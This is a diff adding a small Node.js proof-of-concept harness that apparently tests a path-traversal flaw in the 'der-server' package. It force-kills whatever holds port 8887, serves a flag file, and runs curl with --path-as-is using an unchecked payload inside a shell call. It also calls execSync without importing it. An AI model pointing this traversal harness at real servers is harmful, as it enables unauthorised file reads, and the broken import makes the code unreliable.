@@ -1,0 +1,20 @@
+function exploitFunction(payload) {
+    const path = require("path");
+    const pathToFlag = path.resolve(__dirname, "../flag.html");
+    const fs = require("fs");
+    const { exec } = require("child_process");
+
+    try {
+        execSync("fuser -k 8887/tcp", () => {});
+    } catch (e) {}
+
+    const pkg = require("der-server");
+    pkg.start(__dirname, "../flag.html", 8887);
+
+    let attack_string = `curl -v --path-as-is "http://127.0.0.1:8887${payload}"`;
+    exec(attack_string, (error, stdout) => {
+        return stdout;
+    });
+}
+
+module.exports = { exploitFunction };
